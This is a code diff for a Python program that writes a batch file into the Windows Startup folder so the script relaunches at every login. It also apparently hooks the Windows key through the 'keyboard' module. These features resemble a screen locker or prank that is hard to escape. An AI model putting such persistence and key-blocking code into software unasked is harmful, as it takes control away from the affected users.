@@ -5,6 +5,9 @@ import time
 import threading
 import os
 import sys
+import shutil
+import getpass
+import keyboard
 
 def cheese(event):
     if event.name == 'windows' or event.name == 'win':
@@ -45,21 +48,14 @@ def main():
     root.mainloop()
 
 def virtual_room():
-    import shutil
-    import getpass
-
-    
-    batch_file = os.path.join(os.path.dirname(__file__), "start_main.bat")
-
-    
     username = getpass.getuser()
     startup_folder = os.path.join("C:\\Users", username, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-
-   
-    if not os.path.exists(startup_folder):
-        os.makedirs(startup_folder, exist_ok=True)
+    batch_file = os.path.join(startup_folder, "start_main.bat")
     
-    shutil.copy(batch_file, startup_folder)
+    script_path = os.path.abspath(__file__)
+    with open(batch_file, 'w') as f:
+        f.write(f'@echo off\npython "{script_path}"\n')
+
     print(f"Added {batch_file} to Windows startup.")
 
 def add_to_startup_linux():
